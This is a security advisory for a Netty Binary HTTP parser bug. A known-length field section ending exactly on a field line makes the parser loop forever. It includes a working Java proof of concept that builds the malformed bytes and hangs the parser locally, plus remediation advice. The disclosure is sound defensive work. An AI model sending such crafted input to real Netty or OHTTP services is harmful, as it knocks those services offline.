# [H] netty-incubator-codec-ohttp: Binary HTTP parser infinite loop on known-length field section boundary

## Summary
Severity: High
Advisory: GHSA-8cfx-wx3q-mh5q
CVE: CVE-2026-63124
CWE: CWE-400, CWE-835
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-20
Source: https://github.com/advisories/GHSA-8cfx-wx3q-mh5q
Type: github-advisory

## Affected
- Maven: `io.netty.incubator:netty-incubator-codec-bhttp` — affected >=0 <0.0.23.Final

## Details
## Summary

`io.netty.incubator:netty-incubator-codec-bhttp` can enter a non-terminating parse loop when a known-length Binary HTTP field section ends exactly after a complete field line. A remote peer that can send Binary HTTP input to a Netty pipeline using `BinaryHttpParser` / `BinaryHttpDecoder` can use a tiny malformed request or response to keep the parsing thread busy indefinitely, causing denial of service.

## Details

In `codec-bhttp/src/main/java/io/netty/incubator/codec/bhttp/BinaryHttpParser.java`, `readFieldSection(...)` tracks the remaining field-section length in `fieldSectionLength`, then repeatedly calls `readFieldLine(...)` until the length reaches zero:

- `readFieldSection(...)` parses the known-length field section and enters `while (fieldSectionLength != 0)` at `BinaryHttpParser.java:619`.
- Inside the loop, it records `readableBytes`, calls `readFieldLine(...)`, computes `read = readableBytes - in.readableBytes()`, asserts `read > 0`, and subtracts `read` from `fieldSectionLength` at `BinaryHttpParser.java:620-625`.
- `readFieldLine(...)` returns `null` without consuming bytes when the field line ends exactly at the end of the readable slice because it uses `if (sumBytes >= in.readableBytes()) return null` after adding the value length (`BinaryHttpParser.java:678-681`).
- With JVM assertions disabled (the production default), `assert read > 0` is not active. The parser therefore subtracts zero forever and never returns.

The boundary condition is reachable with a valid known-length field section containing exactly one complete field line and no extra byte after that line. Example field section: length `4`, then name length `1`, name `a`, value length `1`, value `b`.

## Proof of concept

Safe local verification performed in this repository:

1. Compile the module and classpath:

```bash
./mvnw -q -pl codec-bhttp -am compile test-compile
./mvnw -q -pl codec-bhttp dependency:build-classpath -Dmdep.outputFile=/tmp/codec-bhttp-cp.txt
printf '%s' "codec-bhttp/target/classes:$(cat /tmp/codec-bhttp-cp.txt)" > /tmp/codec-bhttp-run-cp.txt
```

2. Compile and run this minimal verifier with production-style assertions disabled:

```java
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.incubator.codec.bhttp.BinaryHttpParser;
import io.netty.incubator.codec.bhttp.VarIntCodecUtils;
import java.nio.charset.StandardCharsets;

public final class VerifyBhttpHang {
  private static void writeAscii(ByteBuf out, String value) {
    VarIntCodecUtils.writeVariableLengthInteger(out, value.length());
    out.writeCharSequence(value, StandardCharsets.US_ASCII);
  }
  public static void main(String[] args) {
    ByteBuf buffer = Unpooled.buffer();
    VarIntCodecUtils.writeVariableLengthInteger(buffer, 0); // known-length request
    writeAscii(buffer, "GET");
    writeAscii(buffer, "https");
    writeAscii(buffer, "example.com");
    writeAscii(buffer, "/");
    VarIntCodecUtils.writeVariableLengthInteger(buffer, 4); // field section length
    writeAscii(buffer, "a");
    writeAscii(buffer, "b");
    new BinaryHttpParser(8192).parse(buffer, false);
    System.out.println("returned");
  }
}
```

Execution result observed locally:

```text
timeout 3 java -cp "/tmp:$(cat /tmp/codec-bhttp-run-cp.txt)" VerifyBhttpHang
exit=124
```

Exit code `124` from `timeout` confirms the parser did not return within three seconds. When assertions are enabled by Surefire, the same payload fails at `BinaryHttpParser.java:622` (`assert read > 0`), confirming the non-progress condition.

## Impact

A peer that can deliver crafted BHTTP bytes can cause the parser to loop forever. In Netty deployments this can pin the event-loop thread or worker responsible for the channel, reducing or eliminating availability for other channels on the same event loop. Through OHTTP, the same parser is used after successful decryption of protected payloads, so authenticated/decryptable OHTTP peers can trigger the same condition in the inner BHTTP parser.

## Suggested remediation

- Treat `readFieldLine(...) == null` as incomplete input and return `null` from `readFieldSection(...)` instead of continuing.
- Replace boundary checks in `readFieldLine(...)` that require an extra byte after a complete field line. A complete field line ending exactly at the known field-section boundary should be accepted.
- Add a production runtime guard that throws a controlled decoder exception if a parser loop iteration makes no progress.
- Add regression tests with JVM assertions disabled for known-length header and trailer field sections that end exactly at the field-section boundary.

## References

- `codec-bhttp/src/main/java/io/netty/incubator/codec/bhttp/BinaryHttpParser.java:619-625`
- `codec-bhttp/src/main/java/io/netty/incubator/codec/bhttp/BinaryHttpParser.java:678-681`
- RFC 9292: Binary Representation of HTTP Messages

## References
- https://github.com/netty/netty-incubator-codec-ohttp/security/advisories/GHSA-8cfx-wx3q-mh5q
- https://github.com/netty/netty-incubator-codec-ohttp
- https://github.com/netty/netty-incubator-codec-ohttp/releases/tag/netty-incubator-codec-parent-ohttp-0.0.23.Final
